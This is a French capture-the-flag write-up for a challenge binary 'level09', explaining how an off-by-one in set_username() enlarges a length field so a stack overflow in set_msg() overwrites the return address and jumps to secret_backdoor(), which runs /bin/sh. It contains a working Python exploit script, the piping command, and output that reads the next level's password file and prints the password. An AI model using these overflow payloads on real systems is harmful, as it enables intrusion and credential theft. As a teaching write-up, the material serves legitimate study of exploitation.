# Level09

Exploiter un off-by-one overflow pour modifier une var len, permettant ensuite un buffer overflow qui redirige l'exécution vers secret_backdoor().

## Analyse du programme

### Exécution normale

```bash
./level09
>: Enter your username
>>: test
>: Welcome, test
>: Msg @Unix-Dude
>>: hello
>: Msg sent!
```

### Fonctions disponibles

```bash
(gdb) info functions
0x000055555555488c  secret_backdoor    ← Jamais appelée 
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
```

### Analyse de `secret_backdoor()`

```bash
(gdb) disas secret_backdoor
```

```c
void secret_backdoor() {
    char buffer[128];
    fgets(buffer, 128, stdin);    // Lit notre input
    system(buffer);                // L'exécute 
}
```

- objectif: atteindre cette fonction.

## Reconstruction du code

### Structure de données

- En analysant `handle_msg()` avec GDB, on identifie:

```c
typedef struct s_message {
    char text[140];      // 0x8c bytes
    char username[40];   // 0x28 bytes  
    int len;             // 4 bytes (initialisé à 140)
} t_message;
```

### Fonction `set_username()`:

```c
void set_username(t_message *message) {
    char buffer[128];
    fgets(buffer, 128, stdin);
    
    for (int i = 0; i <= 40; i++) {    // bug: i <= 40 au lieu de i < 40
        message->username[i] = buffer[i];
    }
}
```

- Faille : La boucle fait 41 itérations au lieu de 40 → off-by-one overflow

### Fonction `set_msg()`:

```c
void set_msg(t_message *message) {
    char buffer[1024];
    fgets(buffer, 1024, stdin);
    strncpy(message->text, buffer, message->len);  // Utilise len
}
```

- `strncpy` copie `message->len` bytes (normalement 140)

## plan d'exploitation étape par étape

### Étape 1 : Disposition mémoire:

```
Stack de handle_msg() :
─────────────────────────────
rbp - 0xc0  : text[140]
rbp - 0x2c  : username[40]
rbp - 0x04  : len (4 bytes)    ← suit username 
rbp         : saved rbp
rbp + 0x08  : saved RIP         ← cible (Return address)
```

### Étape 2 : Off-by-one pour modifier len:

- Avec 41 caractères en input :

```bash
Input : "A" * 40 + "\xd0"

Résultat :
username[0-39] = 'A'
len = 0x000000d0 (208)   ← Écrasé de 140 → 208 
```

- Pourquoi `\xd0` (208) ?

- Calcul de la distance de text[] à saved RIP:

```bash
(gdb) p/d (0x7fffffffe598) - (0x7fffffffe4d0)
$1 = 200
```

- On a besoin de 200 bytes de padding + 8 bytes d'adresse = 208 bytes minimum

### Étape 3 : Buffer overflow vers RIP (Return address):

- Maintenant len = 208, donc strncpy peut copier 208 bytes:

```bash
Input : "B" * 200 + struct.pack('Q', 0x55555555488c)

Résultat :
text[] rempli de 'B', déborde jusqu'à
saved RIP = 0x55555555488c  ← Adresse de secret_backdoor()
```

- Quand handle_msg() retourne :
1. L'instruction `ret` lit `saved RIP`
2. Au lieu de retourner à `main()`, le CPU saute à secret_backdoor()

### Étape 4 : Exécution de commande:

- secret_backdoor() exécute fgets() puis system() avec notre input → on lui donne `/bin/sh`

## Exploitation

### Script Python

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import struct

# Étape 1 : Modifier len (140 → 208)
username = "A" * 40 + "\xd0"

# Étape 2 : Overflow jusqu'à RIP (return addr) et l'écraser
message = "B" * 200 + struct.pack('Q', 0x55555555488c)

# Étape 3 : Commande pour secret_backdoor
command = "/bin/sh"

print(username)
print(message)
print(command)
```

- pour struct.pack('Q', ...):
	- Convertit l'adresse en 8 bytes little-endian
	- `0x55555555488c` → `\x8c\x48\x55\x55\x55\x55\x00\x00`

### Génération et exécution

```bash
python exploit.py > payload
(cat payload; cat) | ./level09
```

- Pourquoi (cat payload; cat)?

Le programme fait 3 appels à fgets():
1. set_username() → lit ligne 1
2. set_msg() → lit ligne 2  
3. secret_backdoor() → doit lire notre commande

- Le deuxième cat garde stdin ouvert pour qu'on puisse interagir avec le shell

- Sans le deuxième cat:
```bash
cat payload | ./level09
└→ Envoie le payload puis ferme stdin (EOF)
   └→ secret_backdoor() reçoit EOF
      └→ system("") ne fait rien
```

- avec le deuxième cat:
```bash
(cat payload; cat) | ./level09
                └→ Attend notre input (stdin reste ouvert)
                   └→ secret_backdoor() peut lire "/bin/sh"
```

### Résultat

```bash
(cat payload; cat) | ./level09
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
>: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
